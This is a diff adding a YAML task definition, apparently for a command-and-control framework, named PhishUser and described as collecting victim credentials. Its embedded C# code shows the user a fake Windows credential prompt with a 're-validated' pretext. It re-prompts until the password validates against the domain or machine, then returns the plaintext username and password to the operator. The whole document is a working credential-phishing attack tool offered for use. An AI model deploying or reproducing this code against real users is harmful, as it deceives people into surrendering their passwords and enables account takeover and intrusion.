@@ -1,0 +1,65 @@
+- Name: PhishUser
+  Aliases: []
+  Author:
+    Name: Chinedu Onwukike
+    Handle: '@pytharmani'
+    Link: https://github.com/py7hagoras
+  Description: A task to collect victim credentials
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: "////Built from the following code https://github.com/matterpreter/OffensiveCSharp\n///Modified to keep prompting user till creds are valid and also handle error cases.\nusing System;\nusing System.Text;\nusing System.Runtime.InteropServices;\nusing System.Net;\nusing System.DirectoryServices.AccountManagement;\n\n\npublic class Task\n{\n    [DllImport(\"ole32.dll\")]\n    public static extern void CoTaskMemFree(IntPtr ptr);\n\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]\n    private struct CREDUI_INFO\n    {\n        public int cbSize;\n        public IntPtr hwndParent;\n        public string pszMessageText;\n        public string pszCaptionText;\n        public IntPtr hbmBanner;\n    }\n\n    [DllImport(\"credui.dll\", CharSet = CharSet.Auto)]\n    private static extern bool CredUnPackAuthenticationBuffer(int dwFlags,\n        IntPtr pAuthBuffer,\n        uint cbAuthBuffer,\n        StringBuilder pszUserName,\n        ref int pcchMaxUserName,\n        StringBuilder pszDomainName,\n        ref int pcchMaxDomainame,\n        StringBuilder pszPassword,\n        ref int pcchMaxPassword);\n\n    [DllImport(\"credui.dll\", CharSet = CharSet.Auto)]\n    private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,\n        int authError,\n        ref uint authPackage,\n        IntPtr InAuthBuffer,\n        uint InAuthBufferSize,\n        out IntPtr refOutAuthBuffer,\n        out uint refOutAuthBufferSize,\n        ref bool fSave,\n        int flags);\n\n    public static void Collector(string message, out NetworkCredential networkCredential)\n    {\n        CREDUI_INFO credui = new CREDUI_INFO();\n        //This block collects the current username and prompts them. This is easily modifiable.\n        string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n        credui.pszCaptionText = message;\n        credui.pszMessageText = \"Please enter the credentials for \" + username;\n        credui.cbSize = Marshal.SizeOf(credui);\n        uint authPackage = 0;\n        IntPtr outCredBuffer = new IntPtr();\n        uint outCredSize;\n        bool save = false;\n        int result = CredUIPromptForWindowsCredentials(ref credui,\n            0,\n            ref authPackage,\n            IntPtr.Zero,\n            0,\n            out outCredBuffer,\n            out outCredSize,\n            ref save,\n            1);\n\n        var usernameBuf = new StringBuilder(256);\n        var passwordBuf = new StringBuilder(256);\n        var domainBuf = new StringBuilder(128);\n\n        int maxUserName = 256;\n        int maxDomain = 256;\n        int maxPassword = 128;\n        if (result == 0)\n        {\n            if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName,\n                domainBuf, ref maxDomain, passwordBuf, ref maxPassword))\n            {\n                CoTaskMemFree(outCredBuffer);\n                networkCredential = new NetworkCredential()\n                {\n                    UserName = usernameBuf.ToString(),\n                    Password = passwordBuf.ToString(),\n                    Domain = domainBuf.ToString()\n                };\n                return;\n            }\n        }\n        networkCredential = null;\n    }\n\n    public static string Execute(string message)\n    {\n\n        try\n        {\n            bool valid = false;\n            PrincipalContext pcon = null;\n            bool domainNotAvailable = false;\n            bool dcoffline = false;\n            while (!valid)\n            {\n              \n               	Collector(message, out NetworkCredential networkCredential);\n            \n\n                try\n                {\n                    pcon = new PrincipalContext(ContextType.Domain, networkCredential.Domain);\n\n                }\n                catch (NullReferenceException)\n                {\n                    //return \"[-] User exited prompt, retrying\";\n                    continue;\n                }\n                //https://stackoverflow.com/questions/48538582/principalcontext-validatecredentials-with-cached-credentials-in-c-sharp\n                catch (System.DirectoryServices.AccountManagement.PrincipalServerDownException)\n                {\n                    domainNotAvailable = true;\n                    try\n                    {\n                        pcon = new PrincipalContext(ContextType.Machine, Environment.MachineName);\n                    }\n                    catch (Exception ex2)\n                    {\n                        throw new Exception(ex2.Message);\n                    }\n                }\n                string realUserName = \"\";\n                //try {realUserName = networkCredential.UserName;} catch (NullReferenceException) {continue;}\n                try {realUserName = !domainNotAvailable ? networkCredential.UserName : $\"{networkCredential.Domain}\\\\{networkCredential.UserName}\";} catch (NullReferenceException) {continue;}\n                //try {realUserName = !domainNotAvailable ? networkCredential.UserName : networkCredential.UserName;} catch (NullReferenceException) {continue;}\n                try { valid = pcon.ValidateCredentials(realUserName, networkCredential.Password); } \n                	catch (System.DirectoryServices.AccountManagement.PrincipalOperationException) { valid = false; continue; }\n                    	// this returns the entered credentials if DC can't be contacted.\n                    	catch (System.IO.FileNotFoundException) { dcoffline = true;}\n                if (valid)\n                {\n\n                    return \"Creds are Valid\\r\\n[+] Collected Credentials:\\r\\n\" +\n                         \"Username: \" + networkCredential.Domain + \"\\\\\" + networkCredential.UserName + \"\\r\\n\" +\n                         \"Password: \" + networkCredential.Password;\n\n                }\n                else if (dcoffline)\n                {\n                    return \"DC not online, so not sure if this is valid\\r\\n[+] Collected Credentials:\\r\\n\" +\n                        \"Username: \" + networkCredential.UserName + \"\\r\\n\" +\n                        \"Password: \" + networkCredential.Password + \"\\r\\n\" + networkCredential.Domain;\n                }	\n            } return \"[+] Just had to be here\";\n\n        }\n        catch (Exception e) { return e.GetType().FullName; }\n    } \n}"
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: message
+    Value: Please enter your credentials to be re-validated
+    DefaultValue: ''
+    Description: Message to display to user
+    SuggestedValues:
+    - Please enter your credentials to be re-validated
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: System.DirectoryServices.AccountManagement.dll
+    Location: net40/System.DirectoryServices.AccountManagement.dll
+    DotNetVersion: Net40
+  - Name: System.dll
+    Location: net40/System.dll
+    DotNetVersion: Net40
+  - Name: System.Security.dll
+    Location: net40/System.Security.dll
+    DotNetVersion: Net40
+  - Name: System.Management.Automation.dll
+    Location: net40/System.Management.Automation.dll
+    DotNetVersion: Net40
+  - Name: mscorlib.dll
+    Location: net40/mscorlib.dll
+    DotNetVersion: Net40
+  - Name: System.Management.dll
+    Location: net35/System.Management.dll
+    DotNetVersion: Net35
+  - Name: System.DirectoryServices.AccountManagement.dll
+    Location: net35/System.DirectoryServices.AccountManagement.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35/System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35/System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net35/mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.DirectoryServices.dll
+    Location: net35/System.DirectoryServices.dll
+    DotNetVersion: Net35
+  - Name: System.Management.dll
+    Location: net40/System.Management.dll
+    DotNetVersion: Net40
+  EmbeddedResources: []
